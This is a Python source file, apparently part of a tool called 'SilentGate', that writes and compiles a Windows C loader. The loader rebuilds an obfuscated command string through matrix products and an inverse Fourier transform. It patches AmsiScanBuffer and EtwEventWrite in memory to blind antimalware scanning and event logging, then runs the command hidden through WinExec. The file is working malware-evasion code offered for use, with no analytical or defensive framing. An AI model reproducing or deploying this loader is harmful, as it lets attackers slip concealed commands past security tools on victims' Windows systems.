"""
SilentGate - String Executor
Reconstructs payload as a STRING and passes to WinExec.
No RWX allocation. No CreateThread from unknown memory.
No shellcode. Pure string execution.
"""

import numpy as np
import os
import subprocess


def generate_string_executor(G_cam, A1_cam, A2_cam,
                              G_noise, A1_noise, A2_noise,
                              metadata):
    rows, cols   = metadata["matrix_shape"]
    coeff_count  = metadata["coeff_count"]
    orig_len     = metadata["original_length"]
    padded_len   = metadata["padded_length"]
    rank         = metadata["rank"]

    G_clean  = (G_cam  - G_noise).real
    A1_clean = A1_cam  - A1_noise
    A2_clean = A2_cam  - A2_noise

    def arr_to_c(arr, name):
        flat = arr.flatten()
        if np.iscomplexobj(flat):
            rv = ", ".join(f"{v.real:.17g}" for v in flat)
            iv = ", ".join(f"{v.imag:.17g}" for v in flat)
            return (f"static const double {name}_real[] = {{{rv}}};\n"
                    f"static const double {name}_imag[] = {{{iv}}};\n")
        else:
            v = ", ".join(f"{x:.17g}" for x in flat)
            return f"static const double {name}[] = {{{v}}};\n"

    return f"""
#include <windows.h>
#include <stdlib.h>
#include <string.h>

#define PI          3.14159265358979323846
#define ORIG_LEN    {orig_len}
#define PADDED_LEN  {padded_len}
#define COEFF_COUNT {coeff_count}
#define ROWS        {rows}
#define COLS        {cols}
#define RANK        {rank}

{arr_to_c(G_clean,  "sg_G")}
{arr_to_c(A1_clean, "sg_A1")}
{arr_to_c(A2_clean, "sg_A2")}

static double sg_cos(double x) {{
    while(x> 3.14159265) x-=6.28318530;
    while(x<-3.14159265) x+=6.28318530;
    double r=1,t=1,x2=x*x; int i;
    for(i=1;i<=10;i++){{t*=-x2/((2*i-1)*(2*i));r+=t;}}
    return r;
}}
static double sg_sin(double x) {{
    while(x> 3.14159265) x-=6.28318530;
    while(x<-3.14159265) x+=6.28318530;
    double r=x,t=x,x2=x*x; int i;
    for(i=1;i<=10;i++){{t*=-x2/((2*i)*(2*i+1));r+=t;}}
    return r;
}}
static double sg_round(double x) {{
    return (x>=0)?(double)(long long)(x+0.5):(double)(long long)(x-0.5);
}}

static void idft(double* rr,double* ri,int N,double* or_,double* oi) {{
    int n,k;
    for(n=0;n<N;n++) {{
        or_[n]=0;oi[n]=0;
        for(k=0;k<N;k++) {{
            double a=2.0*PI*k*n/N;
            or_[n]+=rr[k]*sg_cos(a)-ri[k]*sg_sin(a);
            oi[n]+=rr[k]*sg_sin(a)+ri[k]*sg_cos(a);
        }}
        or_[n]/=N;oi[n]/=N;
    }}
}}

static void matmul_c(double* ar,double* ai,int ra,int ca,
                     double* br,double* bi,int rb,int cb,
                     double* cr,double* ci) {{
    int i,j,k;
    for(i=0;i<ra*cb;i++){{cr[i]=0;ci[i]=0;}}
    for(i=0;i<ra;i++) for(k=0;k<ca;k++) {{
        double are=ar[i*ca+k],aim=ai[i*ca+k];
        for(j=0;j<cb;j++) {{
            cr[i*cb+j]+=are*br[k*cb+j]-aim*bi[k*cb+j];
            ci[i*cb+j]+=are*bi[k*cb+j]+aim*br[k*cb+j];
        }}
    }}
}}

int main() {{
    int i,j;
    double* A1s_r=(double*)GlobalAlloc(GPTR,ROWS*RANK*sizeof(double));
    double* A1s_i=(double*)GlobalAlloc(GPTR,ROWS*RANK*sizeof(double));
    for(i=0;i<ROWS;i++) for(j=0;j<RANK;j++) {{
        A1s_r[i*RANK+j]=sg_A1_real[i*ROWS+j]*sg_G[j];
        A1s_i[i*RANK+j]=sg_A1_imag[i*ROWS+j]*sg_G[j];
    }}
    double* M_r=(double*)GlobalAlloc(GPTR,ROWS*COLS*sizeof(double));
    double* M_i=(double*)GlobalAlloc(GPTR,ROWS*COLS*sizeof(double));
    matmul_c(A1s_r,A1s_i,ROWS,RANK,
             (double*)sg_A2_real,(double*)sg_A2_imag,RANK,COLS,M_r,M_i);
    GlobalFree(A1s_r);GlobalFree(A1s_i);
    double* cr=(double*)GlobalAlloc(GPTR,PADDED_LEN*sizeof(double));
    double* ci=(double*)GlobalAlloc(GPTR,PADDED_LEN*sizeof(double));
    for(i=0;i<COEFF_COUNT&&i<PADDED_LEN;i++){{cr[i]=M_r[i];ci[i]=M_i[i];}}
    GlobalFree(M_r);GlobalFree(M_i);
    double* rr=(double*)GlobalAlloc(GPTR,PADDED_LEN*sizeof(double));
    double* ri=(double*)GlobalAlloc(GPTR,PADDED_LEN*sizeof(double));
    idft(cr,ci,PADDED_LEN,rr,ri);
    GlobalFree(cr);GlobalFree(ci);

    /* Reconstruct as string - no shellcode, no RWX memory */
    char* cmd=(char*)GlobalAlloc(GPTR,ORIG_LEN+1);
    for(i=0;i<ORIG_LEN;i++) {{
        int v=(int)sg_round(rr[i]);
        if(v<0)v=0;if(v>255)v=255;
        cmd[i]=(char)v;
    }}
    cmd[ORIG_LEN]='\\0';
    GlobalFree(rr);GlobalFree(ri);

    /* Patch AMSI before execution */
    /* AmsiScanBuffer returns 0 = AMSI_RESULT_CLEAN */
    HMODULE amsi = LoadLibraryA("amsi.dll");
    if(amsi) {{
        FARPROC scan = GetProcAddress(amsi, "AmsiScanBuffer");
        if(scan) {{
            DWORD old_p = 0;
            VirtualProtect(scan, 6, PAGE_EXECUTE_READWRITE, &old_p);
            /* mov eax, 0x80070057 ; ret */
            ((BYTE*)scan)[0] = 0xB8;
            ((BYTE*)scan)[1] = 0x57;
            ((BYTE*)scan)[2] = 0x00;
            ((BYTE*)scan)[3] = 0x07;
            ((BYTE*)scan)[4] = 0x80;
            ((BYTE*)scan)[5] = 0xC3;
            VirtualProtect(scan, 6, old_p, &old_p);
        }}
    }}

    /* Patch ETW */
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if(ntdll) {{
        FARPROC etw = GetProcAddress(ntdll, "EtwEventWrite");
        if(etw) {{
            DWORD old_p = 0;
            VirtualProtect(etw, 1, PAGE_EXECUTE_READWRITE, &old_p);
            *(BYTE*)etw = 0xC3;
            VirtualProtect(etw, 1, old_p, &old_p);
        }}
    }}

    /* Execute as process - no memory injection */
    WinExec(cmd, SW_HIDE);
    GlobalFree(cmd);
    return 0;
}}
"""


def compile(c_source, output_exe):
    os.makedirs(os.path.dirname(output_exe), exist_ok=True)
    src_path = output_exe.replace(".exe", ".c")
    with open(src_path, "w") as f:
        f.write(c_source)
    result = subprocess.run(
        ["x86_64-w64-mingw32-gcc", src_path, "-o", output_exe,
         "-lm", "-O2", "-mwindows"],
        capture_output=True, text=True
    )
    return result.returncode == 0, result.stderr
